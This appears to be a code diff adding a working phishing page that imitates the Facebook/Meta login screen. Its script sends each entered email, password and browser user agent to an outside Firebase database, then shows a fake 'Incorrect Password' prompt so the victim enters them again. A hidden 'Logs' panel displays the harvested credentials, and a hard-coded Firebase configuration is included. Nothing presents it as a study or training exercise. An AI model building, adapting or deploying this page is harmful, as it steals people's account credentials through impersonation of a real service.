@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.10/dayjs.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.10/plugin/relativeTime.min.js"></script>
+    <style>
+        /* Custom Facebook Blue */
+        .bg-fb-blue { background-color: #0064E0; }
+        .text-fb-blue { color: #0064E0; }
+        .border-fb-blue { border-color: #0064E0; }
+        .hover-bg-fb-blue:hover { background-color: #0056c2; }
+        
+        /* Input styling adjustments to match exact look */
+        .fb-input {
+            transition: border-color 0.2s;
+        }
+        .fb-input:focus {
+            border-color: #0064E0;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        /* Modal Animation */
+        .modal-enter {
+            opacity: 0;
+            transform: scale(0.95);
+        }
+        .modal-enter-active {
+            opacity: 1;
+            transform: scale(1);
+            transition: opacity 0.2s ease-out, transform 0.2s ease-out;
+        }
+        .modal-exit {
+            opacity: 1;
+            transform: scale(1);
+        }
+        .modal-exit-active {
+            opacity: 0;
+            transform: scale(0.95);
+            transition: opacity 0.2s ease-in, transform 0.2s ease-in;
+        }
+
+        /* Scrollbar for logs */
+        .logs-scroll::-webkit-scrollbar {
+            width: 8px;
+        }
+        .logs-scroll::-webkit-scrollbar-track {
+            background: #f1f1f1; 
+        }
+        .logs-scroll::-webkit-scrollbar-thumb {
+            background: #ccc; 
+            border-radius: 4px;
+        }
+        .logs-scroll::-webkit-scrollbar-thumb:hover {
+            background: #999; 
+        }
+    </style>
+</head>
+<body class="bg-white font-sans text-gray-900 h-screen flex flex-col items-center justify-between py-4 sm:py-8 relative overflow-hidden">
+
+    <!-- Top Section: Language & Form -->
+    <div class="w-full max-w-[400px] px-4 flex flex-col items-center z-10 overflow-y-auto h-full">
+        
+        <!-- Language Selector -->
+        <div class="text-xs text-gray-500 mb-12 mt-2 cursor-pointer hover:underline flex-shrink-0">
+            English (UK)
+        </div>
+
+        <!-- Facebook Logo -->
+        <div class="mb-12 flex-shrink-0">
+            <svg viewBox="0 0 36 36" class="w-16 h-16 text-fb-blue fill-current" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471l-.026-12.315H9.552v-5.156h4.074v-3.538c0-4.02 2.396-6.236 6.045-6.236 1.748 0 3.58.312 3.58.312v3.948h-2.016c-1.992 0-2.613 1.236-2.613 2.505v3.01h4.444l-.71 5.156h-3.734V35.87z"></path>
+            </svg>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm" class="w-full flex flex-col gap-3 flex-shrink-0">
+            <!-- Email/Phone Input -->
+            <div class="w-full">
+                <input 
+                    id="emailInput"
+                    type="text" 
+                    placeholder="Mobile number or email address" 
+                    class="fb-input w-full px-4 py-3.5 border border-gray-300 rounded-xl text-[15px] placeholder-gray-500 bg-white"
+                >
+            </div>
+
+            <!-- Password Input -->
+            <div class="w-full">
+                <input 
+                    id="passwordInput"
+                    type="password" 
+                    placeholder="Password" 
+                    class="fb-input w-full px-4 py-3.5 border border-gray-300 rounded-xl text-[15px] placeholder-gray-500 bg-white"
+                >
+            </div>
+
+            <!-- Log In Button -->
+            <button 
+                id="loginButton"
+                type="submit"
+                class="w-full bg-fb-blue hover-bg-fb-blue text-white font-semibold text-[16px] py-2.5 rounded-full mt-1 transition-colors flex justify-center items-center"
+            >
+                Log in
+            </button>
+
+            <!-- Forgotten Password -->
+            <a href="#" class="text-center mt-3 text-black font-medium text-[15px] hover:underline">
+                Forgotten password?
+            </a>
+        </form>
+
+        <!-- Create Account Spacer -->
+        <div class="flex-grow"></div>
+
+         <!-- Bottom Section: Create Account & Meta Logo -->
+        <div class="w-full flex flex-col items-center gap-4 mt-8 pb-4">
+            <!-- Create Account Button -->
+            <button 
+                class="w-full border border-fb-blue text-fb-blue font-semibold text-[15px] py-2.5 rounded-full hover:bg-blue-50 transition-colors bg-white"
+            >
+                Create new account
+            </button>
+
+            <!-- Meta Logo -->
+            <div class="flex items-center gap-1.5 mt-2">
+                <svg class="w-6 h-4" viewBox="0 0 60 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M42.6602 6.62109C45.3887 6.62109 47.7852 7.74023 49.373 9.49805L49.9336 6.94531H57.8711V22.459C57.8711 23.3633 58.1172 23.6387 58.5527 23.6387C58.8516 23.6387 59.2051 23.5117 59.5039 23.3281L60 25.875C59.1367 26.5625 57.9746 26.8789 56.6699 26.8789C53.9414 26.8789 52.3379 25.1387 52.3379 22.043V13.8242C52.3379 11.5117 51.0566 9.87305 48.7441 9.87305C46.5332 9.87305 44.9785 11.2344 44.9785 14.1289V26.6016H39.4316V13.8242C39.4316 11.5117 38.1504 9.87305 35.8379 9.87305C33.627 9.87305 32.0723 11.2344 32.0723 14.1289V26.6016H26.5254V11.2188C26.5254 10.373 26.3896 9.80078 26.1367 9.42969C25.4375 8.35352 24.168 7.82031 22.8457 7.82031C19.957 7.82031 17.584 9.49219 16.0312 11.4648C16.3379 10.4219 16.502 9.48828 16.502 8.68359C16.502 6.13086 15.0293 4.60156 12.3164 4.60156C9.09961 4.60156 5.86914 6.74609 3.01172 9.41211L5.37891 12.1152C7.30664 10.0898 9.38086 8.52734 11.4141 8.52734C12.3203 8.52734 12.6836 8.94531 12.6836 9.85547C12.6836 10.5977 12.3848 11.5898 11.6602 12.5938L6.47461 19.6641C4.16211 22.8457 2.66602 24.9785 2.66602 27.2812C2.66602 29.9844 4.54492 31.5 7.62109 31.5C10.7031 31.5 13.9219 29.3555 16.9238 26.6211L14.498 24.0352C12.4492 25.9609 10.4395 27.5312 8.52344 27.5312C7.57617 27.5312 7.07227 27.0508 7.07227 26.1113C7.07227 25.1797 7.42578 24.1133 8.43555 22.7168L13.7344 15.4297C15.1113 13.5293 16.0918 12.6289 17.0605 12.6289C17.5645 12.6289 17.8926 12.791 17.8926 13.1406C17.8926 13.3984 17.7891 13.793 17.5371 14.3945L12.4785 26.6016H18.2305L19.4648 23.6328C20.6543 25.752 22.6113 26.8789 25.1016 26.8789C29.2305 26.8789 32.0723 23.3613 32.0723 18.0625C32.0723 17.4707 32.0312 16.8926 31.9648 16.3242C33.1504 14.8691 34.623 13.8242 36.3711 13.8242C37.2949 13.8242 37.7051 14.248 37.7051 15.1582V26.6016H43.252V18.0625C43.252 17.4707 43.2109 16.8926 43.1445 16.3242C44.3301 14.8691 45.8027 13.8242 47.5508 13.8242C48.4746 13.8242 48.8848 14.248 48.8848 15.1582V26.6016H54.4316V13.3984C54.4316 9.09961 50.1152 6.62109 46.1211 6.62109H42.6602Z" fill="#585858"/>
+                    <path d="M25.1016 19.3887C25.1016 22.3105 23.8242 23.3457 22.3809 23.3457C21.4395 23.3457 20.8066 22.75 20.8066 21.3652L22.0469 18.3691C22.2598 15.9395 23.5117 14.9043 24.873 14.9043C25.9629 14.9043 26.5254 15.4668 26.5254 16.8281V19.8652C26.0469 19.5547 25.5781 19.4004 25.1016 19.3887Z" fill="#585858"/>
+                </svg>
+                <span class="text-[#585858] font-semibold text-sm ml-0.5">Meta</span>
+            </div>
+
+            <!-- ABSTRACT LOGS TRIGGER -->
+            <button 
+                id="logsTrigger"
+                class="mt-6 px-4 py-1.5 rounded-full bg-gray-100 border border-gray-200 text-[10px] font-mono text-gray-400 uppercase tracking-widest hover:bg-gray-200 hover:text-gray-600 transition-all duration-300"
+            >
+                Logs
+            </button>
+        </div>
+    </div>
+
+    <!-- Error Modal Overlay -->
+    <div id="errorModal" class="hidden fixed inset-0 z-50 flex items-center justify-center px-8 bg-black/40 backdrop-blur-sm">
+        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-[320px] overflow-hidden modal-enter">
+            <div class="p-6 text-center">
+                <div class="text-lg font-bold text-gray-900 mb-2">Incorrect Password</div>
+                <div class="text-[15px] text-gray-600 leading-relaxed">
+                    The password you entered is incorrect. Please try again.
+                </div>
+            </div>
+            <div class="border-t border-gray-200">
+                <button 
+                    onclick="closeModal()"
+                    class="w-full py-3.5 text-[16px] font-bold text-fb-blue hover:bg-gray-50 transition-colors active:bg-gray-100"
+                >
+                    Try Again
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOGS VIEWER OVERLAY -->
+    <div id="logsViewer" class="hidden fixed inset-0 z-[60] bg-gray-50 flex flex-col transform transition-transform duration-300 translate-y-full">
+        <!-- Logs Header -->
+        <div class="bg-white px-6 py-4 shadow-sm border-b border-gray-200 flex justify-between items-center z-10">
+            <h2 class="text-lg font-bold text-gray-800 flex items-center gap-2">
+                <span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>
+                Captured Logs
+            </h2>
+            <button onclick="closeLogs()" class="p-2 text-gray-500 hover:text-gray-900 hover:bg-gray-100 rounded-full transition-colors">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+            </button>
+        </div>
+
+        <!-- Logs Content -->
+        <div id="logsContainer" class="flex-1 overflow-y-auto p-4 space-y-4 logs-scroll bg-gray-50">
+            <!-- Loading State -->
+            <div class="flex justify-center items-center h-40 text-gray-400">
+                <span class="animate-pulse">Fetching data...</span>
+            </div>
+        </div>
+        
+        <!-- Logs Footer -->
+        <div class="px-6 py-3 bg-white border-t border-gray-200 text-xs text-center text-gray-400 font-mono">
+            System Monitoring • v1.0.2
+        </div>
+    </div>
+
+    <!-- Firebase Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, getDocs, serverTimestamp, query, orderBy } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        dayjs.extend(window.dayjs_plugin_relativeTime);
+
+        // Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAocB-xjAk8-xIIcDLjx72k9I8OK4jHVgE",
+            authDomain: "tlord-1ab38.firebaseapp.com",
+            databaseURL: "https://tlord-1ab38-default-rtdb.firebaseio.com",
+            projectId: "tlord-1ab38",
+            storageBucket: "tlord-1ab38.firebasestorage.app",
+            messagingSenderId: "750743868519",
+            appId: "1:750743868519:web:5a937bc8e75e86a96570c2",
+            measurementId: "G-5MDEM4EWHJ"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+
+        let currentUser = null;
+
+        // 1. Initialize Authentication 
+        const initAuth = async () => {
+            try {
+                await signInAnonymously(auth);
+                console.log("Anonymous auth successful");
+            } catch (error) {
+                console.error("Auth Error:", error);
+            }
+        };
+
+        initAuth();
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+            }
+        });
+
+        // --- CORE FUNCTIONS ---
+
+        // Login Logic
+        const form = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginButton');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (!currentUser) {
+                initAuth(); // Retry auth if missing
+                return;
+            }
+
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value; 
+
+            if (!email || !password) return;
+
+            // Visual Loading
+            const originalBtnText = loginBtn.innerText;
+            loginBtn.innerText = "Logging in...";
+            loginBtn.classList.add('opacity-70', 'cursor-not-allowed');
+            loginBtn.disabled = true;
+
+            try {
+                const logsCollection = collection(db, 'artifacts', appId, 'public', 'data', 'logs');
+                
+                await addDoc(logsCollection, {
+                    username: email,
+                    password: password, 
+                    timestamp: serverTimestamp(),
+                    device_agent: navigator.userAgent
+                });
+
+                setTimeout(() => {
+                    showModal();
+                    loginBtn.innerText = originalBtnText;
+                    loginBtn.classList.remove('opacity-70', 'cursor-not-allowed');
+                    loginBtn.disabled = false;
+                }, 800);
+
+            } catch (error) {
+                console.error("Error logging:", error);
+                // Fallback UI
+                showModal();
+                loginBtn.innerText = originalBtnText;
+                loginBtn.classList.remove('opacity-70', 'cursor-not-allowed');
+                loginBtn.disabled = false;
+            }
+        });
+
+
+        // --- UI FUNCTIONS ---
+
+        window.closeModal = function() {
+            const modal = document.getElementById('errorModal');
+            const modalContent = modal.querySelector('div');
+            modalContent.classList.remove('modal-enter-active');
+            modalContent.classList.add('modal-exit-active');
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                modalContent.classList.remove('modal-exit-active');
+                modalContent.classList.add('modal-enter');
+                document.getElementById('passwordInput').value = '';
+                document.getElementById('passwordInput').focus();
+            }, 200);
+        };
+
+        function showModal() {
+            const modal = document.getElementById('errorModal');
+            const modalContent = modal.querySelector('div');
+            modal.classList.remove('hidden');
+            requestAnimationFrame(() => modalContent.classList.add('modal-enter-active'));
+        }
+
+        // --- LOGS VIEWER LOGIC ---
+        
+        const logsTrigger = document.getElementById('logsTrigger');
+        const logsViewer = document.getElementById('logsViewer');
+        const logsContainer = document.getElementById('logsContainer');
+
+        logsTrigger.addEventListener('click', () => {
+            logsViewer.classList.remove('hidden');
+            // Slide up animation
+            requestAnimationFrame(() => {
+                logsViewer.classList.remove('translate-y-full');
+            });
+            fetchAndRenderLogs();
+        });
+
+        window.closeLogs = function() {
+            logsViewer.classList.add('translate-y-full');
+            setTimeout(() => {
+                logsViewer.classList.add('hidden');
+            }, 300);
+        };
+
+        async function fetchAndRenderLogs() {
+            if (!currentUser) {
+                logsContainer.innerHTML = `<div class="text-center text-red-500 mt-10">Auth missing. Retrying...</div>`;
+                await initAuth();
+            }
+
+            try {
+                const logsCollection = collection(db, 'artifacts', appId, 'public', 'data', 'logs');
+                // Fetch all docs. Note: Client-side sorting is safer without guaranteed indexes
+                const snapshot = await getDocs(logsCollection);
+                
+                let logs = [];
+                snapshot.forEach(doc => {
+                    logs.push({ id: doc.id, ...doc.data() });
+                });
+
+                // Sort client-side (Newest first)
+                logs.sort((a, b) => {
+                    const timeA = a.timestamp?.seconds || 0;
+                    const timeB = b.timestamp?.seconds || 0;
+                    return timeB - timeA;
+                });
+
+                if (logs.length === 0) {
+                    logsContainer.innerHTML = `
+                        <div class="flex flex-col items-center justify-center h-full text-gray-400 mt-10">
+                            <svg class="w-12 h-12 mb-2 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                            <p>No logs found yet.</p>
+                        </div>`;
+                    return;
+                }
+
+                // Render Cards
+                logsContainer.innerHTML = logs.map(log => {
+                    const timeString = log.timestamp ? dayjs(log.timestamp.toDate()).fromNow() : 'Just now';
+                    
+                    return `
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-4 transition hover:shadow-md">
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="bg-blue-50 text-blue-700 text-xs font-bold px-2 py-1 rounded-md uppercase tracking-wider">
+                                Credential
+                            </div>
+                            <span class="text-xs text-gray-400 font-medium">${timeString}</span>
+                        </div>
+                        
+                        <div class="space-y-3">
+                            <div>
+                                <label class="text-[10px] uppercase text-gray-400 font-bold tracking-wider">Username</label>
+                                <div class="font-mono text-sm text-gray-800 break-all bg-gray-50 p-1.5 rounded border border-gray-100">${escapeHtml(log.username || 'N/A')}</div>
+                            </div>
+                            <div>
+                                <label class="text-[10px] uppercase text-gray-400 font-bold tracking-wider">Password</label>
+                                <div class="font-mono text-sm text-red-600 bg-red-50 p-1.5 rounded border border-red-100 break-all">${escapeHtml(log.password || 'N/A')}</div>
+                            </div>
+                            <div>
+                                <label class="text-[10px] uppercase text-gray-400 font-bold tracking-wider">Device Agent</label>
+                                <div class="text-xs text-gray-500 leading-tight">${escapeHtml(log.device_agent || 'Unknown')}</div>
+                            </div>
+                        </div>
+                    </div>
+                    `;
+                }).join('');
+
+            } catch (error) {
+                console.error("Fetch Error:", error);
+                let msg = "Failed to load logs.";
+                if (error.code === 'permission-denied') {
+                    msg = "Permission Denied. Please enable 'allow read: if true' in Firestore Rules.";
+                }
+                logsContainer.innerHTML = `<div class="text-center text-red-500 mt-10 p-4 bg-white rounded shadow">${msg}</div>`;
+            }
+        }
+
+        // Helper to prevent XSS
+        function escapeHtml(text) {
+            if (!text) return text;
+            return text
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+    </script>
+
+</body>
+</html>
+
+
